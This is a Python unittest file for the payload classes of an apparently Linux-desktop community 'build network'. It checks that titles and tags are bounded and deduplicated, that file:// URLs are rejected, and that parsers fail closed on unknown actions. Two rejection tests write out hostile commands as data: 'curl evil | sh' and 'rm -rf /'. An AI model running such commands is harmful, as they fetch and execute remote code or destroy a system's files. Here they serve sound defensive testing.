import pathlib
import sys
import unittest

ROOT = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "bin"))

from build_network import (
    BuildJoin,
    BuildRoom,
    Idea,
    IdeaInterest,
    SetupCard,
    TestRequest,
    TestResult,
    parse_payload,
)
from build_network_social import (
    Challenge,
    CommunityEvent,
    HelpRequest,
    ShipPost,
    SolutionCard,
    UpdateReport,
    parse_social_payload,
)


class BuildNetworkTests(unittest.TestCase):
    def test_idea_is_bounded_and_deduplicated(self):
        payload = Idea(
            title="  Better   multi monitor tool  ",
            summary="x" * 1000,
            tags=["QML", "qml", "Hyprland"],
            author="PixelComet",
        ).to_payload()
        self.assertEqual(payload["title"], "Better multi monitor tool")
        self.assertEqual(payload["tags"], ["QML", "Hyprland"])
        self.assertLessEqual(len(payload["summary"]), 360)

    def test_interest_and_join_are_references_not_remote_actions(self):
        interest = IdeaInterest(idea_id="idea_123", note="I can test this").to_payload()
        join = BuildJoin(room_id="build_123", role="AMD tester").to_payload()
        self.assertEqual(interest["idea_id"], "idea_123")
        self.assertEqual(join["room_id"], "build_123")
        self.assertNotIn("command", interest)
        self.assertNotIn("command", join)

    def test_build_room_rejects_non_http_repo_url(self):
        payload = BuildRoom(
            title="OLED monitor",
            repo_url="file:///home/me/secrets",
            roles_needed=["Designer", "AMD tester"],
        ).to_payload()
        self.assertEqual(payload["repo_url"], "")

    def test_setup_card_is_metadata_only(self):
        payload = SetupCard(
            title="My setup",
            theme="Catppuccin",
            plugins=["Friends", "Spotify"],
            components=["x86_64", "Linux"],
            repo_url="https://github.com/example/dotfiles",
            wallpaper_url="https://example.com/wallpaper.jpg",
        ).to_payload()
        self.assertEqual(payload["type"], "setup_card")
        self.assertNotIn("commands", payload)
        self.assertNotIn("files", payload)
        self.assertEqual(payload["repo_url"], "https://github.com/example/dotfiles")

    def test_test_request_and_result_round_trip(self):
        request = TestRequest(
            title="Friends 5 beta",
            artifact_url="https://github.com/example/project",
            requested_tags=["NVIDIA", "AMD", "Framework"],
        ).to_payload()
        parsed = parse_payload(request)
        self.assertEqual(parsed.title, "Friends 5 beta")

        result = TestResult(
            request_id=request["id"],
            result="pass",
            environment_tags=["NVIDIA", "RTX 4060"],
            note="Starts and receives messages.",
        ).to_payload()
        parsed_result = parse_payload(result)
        self.assertEqual(parsed_result.result, "pass")

    def test_help_request_bounds_ai_tried_context(self):
        payload = HelpRequest(
            title="Wi-Fi disconnects",
            problem="Disconnects after resume",
            tried="agent attempted restart " + ("x" * 1000),
            environment_tags=["Intel AX211", "Omarchy"],
        ).to_payload()
        self.assertLessEqual(len(payload["tried"]), 500)
        self.assertNotIn("private_files", payload)

    def test_solution_rejects_local_source_url(self):
        payload = SolutionCard(
            title="Fix wake issue",
            problem="Blank screen",
            solution="Reload the affected user service.",
            source_url="file:///home/user/private-notes.md",
        ).to_payload()
        self.assertEqual(payload["source_url"], "")

    def test_ship_event_challenge_and_update_are_bounded_cards(self):
        ship = ShipPost(title="GPU widget", artifact_url="https://github.com/example/widget").to_payload()
        event = CommunityEvent(title="Bengaluru meetup", event_url="https://example.com/event").to_payload()
        challenge = Challenge(title="Weekend build", prompt="Make something delightful").to_payload()
        report = UpdateReport(version="4.13", result="working", environment_tags=["NVIDIA"]).to_payload()
        self.assertEqual(ship["type"], "ship_post")
        self.assertEqual(event["type"], "community_event")
        self.assertEqual(challenge["type"], "challenge")
        self.assertEqual(report["result"], "working")

    def test_social_parser_fails_closed_for_unknown_action(self):
        with self.assertRaises(ValueError):
            parse_social_payload({"type": "remote_exec", "command": "curl evil | sh"})

    def test_unknown_core_payload_is_rejected(self):
        with self.assertRaises(ValueError):
            parse_payload({"type": "run_shell", "command": "rm -rf /"})


if __name__ == "__main__":
    unittest.main()
